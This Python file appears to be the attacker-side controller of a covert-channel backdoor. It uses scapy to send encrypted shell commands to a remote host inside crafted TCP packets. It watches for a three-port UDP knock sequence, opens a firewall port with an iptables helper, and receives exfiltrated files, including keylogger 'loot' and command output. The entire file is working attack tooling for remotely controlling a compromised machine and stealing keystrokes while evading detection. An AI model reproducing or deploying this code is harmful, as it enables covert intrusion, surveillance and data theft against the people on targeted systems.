#!/usr/bin/python3
import time, os, sys, logging
import threading
from scapy.all import *
import netifaces
import encryption
import helpers
import iptablesManager

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
CHUNK_SIZE = 16
BUFSIZE = 1024

"""
Design for covert channel
password stored in ip_option field
type of response stored in tcp reserved field
result stored in tcp payload
"""
class Attacker(object):

    def __init__(self, lhost, lport, fport, rhost, rport, proto, password, kList, ttl):
        self.localIP = lhost
        self.localPort = int(lport)
        self.filePort = int(fport)
        self.remoteIP = rhost
        self.remotePort = int(rport)
        self.protocol = proto.upper()

        self.password = password

        self.knockList = kList.split(',')
        self.ttl = int(ttl)
        self.state = 0

    def run(self):
        helpers.checkRootPrivilege()

        send_command_thread = threading.Thread(target=self.sendCommand)
        send_command_thread.setDaemon(True)
        send_command_thread.start()

        knock_listener_thread = threading.Thread(target=self.knockListener)
        knock_listener_thread.setDaemon(True)
        knock_listener_thread.start()

        try:
            while threading.active_count() > 0:
                time.sleep(0.1)
        except KeyboardInterrupt:
            print('Attacker closed...\n')
            sys.exit(0)

    def sendCommand(self):
        while True:
            cmd = raw_input()
            sys.stdout.flush()
            payload = encryption.encrypt(self.password + cmd)
            packet = IP(dst=self.remoteIP, src=self.localIP)/TCP(dport=self.remotePort, sport=self.localPort)/Raw(load=payload)
            send(packet, verbose=False)

            if cmd == 'CLOSE':
                print("Attacker closed...\n")
                os._exit(0)

    """
    Listen for incoming knock
    """

    def knockListener(self):
        mFilter = "udp and src host " + self.remoteIP + " and src port " + str(self.remotePort)
        while True:
            sniff(filter=mFilter, prn=self.knockReceive, count=1)

    def knockReceive(self, packet):
        if packet.haslayer(UDP):
            port = packet[UDP].dport
            if port == int(self.knockList[0]) and self.state == 0:
                self.state = 1
            elif port == int(self.knockList[1]) and self.state == 1:
                self.state = 2
            elif port == int(self.knockList[2]) and self.state == 2:
                self.state = 3
                print("Knocking successfully...Openning port for receiving")
                self.acceptRequest()
                self.state = 0
            else:
                self.state = 0

    def acceptRequest(self):
        iptablesManager.run(self.protocol, self.remoteIP, str(self.filePort), self.ttl)

        sock = helpers.createSocket()
        port = self.filePort
        sock.bind((self.localIP, port))

        sock.listen(1)
        conn, addr = sock.accept()
        print("Receive connection from {}".format(addr))

        dummyFile = "received_data.txt"
        with open(dummyFile, 'wb') as receivedData:
            while True:
                data = conn.recv(BUFSIZE)

                if data.endswith(b"EOF"):
                    data = data[:-3]
                    receivedData.write(data)
                    break
                receivedData.write(data)

        conn.close()
        sucess, filename = encryption.decryptFile(dummyFile)
        if sucess:
            if filename == "loot.txt":
                with open(filename, "rb") as myfile:
                    print("Keylogg: {}".format(myfile.read()))
            elif filename == "result.txt":
                with open(filename, "rb") as myfile:
                    print("Result: {}".format(myfile.read()))
        os.remove(dummyFile)
        print("Done receiving!")

    def isIncoming(self, packet):
        """
        Check if packets are incoming or outgoing.
        """
        # Get the default hardware interface
        defaultInterface = netifaces.gateways()['default'][netifaces.AF_INET][1]
        hardwareAddr = netifaces.ifaddresses(defaultInterface)[netifaces.AF_LINK][0]['addr']
        return packet[Ether].src != hardwareAddr
